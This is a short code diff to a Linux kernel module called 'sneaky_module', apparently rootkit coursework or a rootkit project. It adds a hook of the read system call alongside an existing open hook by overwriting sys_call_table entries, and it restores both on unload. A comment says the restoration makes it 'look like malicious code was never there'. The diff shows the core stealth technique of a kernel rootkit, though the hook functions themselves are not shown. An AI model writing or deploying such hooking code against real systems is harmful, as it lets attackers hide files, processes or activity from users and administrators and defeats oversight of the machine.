@@ -102,6 +102,9 @@ static int initialize_sneaky_module(void)
   original_call_open = (void*)*(sys_call_table + __NR_open);
   *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
 
+  original_call_read = (void*)*(sys_call_table + __NR_read);
+  *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
+
   //Revert page to read-only
   pages_ro(page_ptr, 1);
   //Turn write protection mode back on
@@ -129,6 +132,8 @@ static void exit_sneaky_module(void)
   //This is more magic! Restore the original 'open' system call
   //function address. Will look like malicious code was never there!
   *(sys_call_table + __NR_open) = (unsigned long)original_call_open;
+
+  *(sys_call_table + __NR_read) = (unsigned long)original_call_read;
 
   //Revert page to read-only
   pages_ro(page_ptr, 1);
